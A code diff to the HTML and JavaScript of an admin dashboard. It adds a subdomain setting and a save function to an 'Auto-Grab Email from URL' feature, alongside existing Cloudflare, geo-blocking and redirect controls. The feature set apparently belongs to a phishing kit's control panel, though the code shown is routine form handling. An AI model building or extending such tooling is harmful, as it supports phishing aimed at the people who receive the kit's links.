@@ -95,8 +95,8 @@
             font-size: 8px;
             transition: all 0.2s;
         }
-        
-        
+
+
         .auth-success {
             color: #22c55e;
             display: flex;
@@ -561,7 +561,7 @@
                 </div>
             </div>
 
-         
+
             <!-- Cloudflare Tab -->
             <div id="cloudflare-tab" class="tab-content">
                 <!-- Cloudflare Enable/Disable Toggle -->
@@ -604,7 +604,7 @@
                     ⚠️ Not Configured
                 </div>
 
-               
+
 
                 <!-- Security Controls Section -->
                 <h2 class="section-title" style="margin-top: 32px;">Security Controls</h2>
@@ -749,7 +749,7 @@
                     </div>
                 </div>
 
-                
+
                 <div class="dashboard-grid" style="margin-bottom: 20px;">
                     <div class="dashboard-card">
                         <div class="dashboard-card-icon">🌍</div>
@@ -776,7 +776,7 @@
 
                     <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 10px 0;">Geo-Blocking Settings</h3>
 
-                  
+
 
                     <div class="form-group">
                         <label class="form-label">Access Mode:</label>
@@ -804,13 +804,13 @@
                     </div>
                 </div>
 
-                
+
 
             <!-- Auto-Grab Tab -->
             <div id="autograb-tab" class="tab-content">
 
                 <div class="form-group">
-                    <label class="form-label">Auto-Grab Email from URL:</label>
+                    <label class="form-label">Enable Auto-Grab Email from URL:</label>
                     <div style="display: flex; gap: 12px; align-items: center;">
                         <button onclick="toggleAutoGrab()" id="autograb-toggle-btn" class="btn">
                             Enable Auto-Grab
@@ -822,8 +822,19 @@
                     </p>
                 </div>
 
+                <div class="form-group" style="margin-top: 20px;">
+                    <label class="form-label">Subdomain for Auto-Grab (Optional):</label>
+                    <input type="text" id="autograb-subdomain-input" class="form-control" 
+                           placeholder="e.g., app or secure.example.com" 
+                           style="background: #0f172a; border: 1px solid #475569; color: #e2e8f0; padding: 8px 12px; border-radius: 6px;">
+                    <p style="font-size: 13px; color: #94a3b8; margin-top: 8px;">
+                        Leave empty to work on all domains, or specify a subdomain (e.g., "app" or "secure.yourdomain.com")
+                    </p>
+                    <div style="margin-top: 12px;">
+                        <button onclick="saveSubdomain()" class="btn btn-success">Save Subdomain</button>
+                    </div>
+                </div>
 
-                
                 <h2 class="section-title">Auto-Grab URL Parser</h2>
 
                 <div class="dashboard-grid" style="margin-bottom: 20px;">
@@ -845,10 +856,10 @@
 
                     <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">URL Parser Settings</h3>
 
-                 
-                    
 
-                
+
+
+
 
                     <div id="autograb-result" style="display: none; background: #0f172a; border: 1px solid #475569; padding: 16px; border-radius: 6px;">
                         <h4 style="color: #22c55e; font-size: 14px; margin: 0 0 12px 0;">✅ Parsing Result</h4>
@@ -1343,12 +1354,12 @@
                     if (data.config.configured) {
                         document.getElementById('cf-config-status').innerHTML = 
                             `<span class="status-badge status-success">✅ Configured (${data.config.authMethod === 'token' ? 'API Token' : 'Global API Key'})</span>`;
-                        
+
                         // Update toggle button state
                         const toggleBtn = document.getElementById('cf-toggle-btn');
                         const toggleStatus = document.getElementById('cf-toggle-status');
                         toggleBtn.disabled = false;
-                        
+
                         if (data.config.enabled) {
                             toggleBtn.textContent = 'Disable Cloudflare';
                             toggleBtn.classList.remove('btn-success');
@@ -1910,6 +1921,7 @@
 
                     document.getElementById('autograb-status').textContent = config.enabled ? 'ON' : 'OFF';
                     document.getElementById('autograb-redirect').textContent = config.autoRedirect ? 'Enabled' : 'Disabled';
+                    document.getElementById('autograb-subdomain-input').value = config.subdomain || ''; // Load subdomain
 
                     const toggleBtn = document.getElementById('autograb-toggle-btn');
                     const toggleStatus = document.getElementById('autograb-toggle-status');
@@ -1969,7 +1981,44 @@
             }
         }
 
-        
+        async function saveSubdomain() {
+            if (!isAuthenticated) {
+                alert('Please log in first');
+                return;
+            }
+
+            const subdomainInput = document.getElementById('autograb-subdomain-input');
+            const subdomain = subdomainInput.value.trim();
+            const saveBtn = subdomainInput.nextElementSibling.querySelector('button'); // Get the save button
+
+            saveBtn.disabled = true;
+            saveBtn.textContent = 'SAVING...';
+
+            try {
+                const token = getStoredToken();
+                const response = await fetch(`/api/admin/autograb/config?token=${encodeURIComponent(token)}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ subdomain: subdomain })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    alert('Subdomain saved successfully!');
+                    loadAutoGrabConfig(); // Reload config to reflect changes
+                } else {
+                    throw new Error(data.error || 'Failed to save subdomain');
+                }
+            } catch (error) {
+                console.error('Error saving subdomain:', error);
+                alert(`Failed to save subdomain: ${error.message}`);
+            } finally {
+                saveBtn.disabled = false;
+                saveBtn.textContent = 'Save Subdomain';
+            }
+        }
+
 
         async function testAutoGrabUrl() {
             if (!isAuthenticated) {
@@ -2424,7 +2473,7 @@
                 if (data.success && data.redirectUrl) {
                     const currentUrl = data.redirectUrl;
                     document.getElementById('current-redirect-display').textContent = `🎯 ${currentUrl}`;
-                
+
 
                     const select = document.getElementById('redirect-destination');
                     const option = Array.from(select.options).find(opt => opt.value === currentUrl);
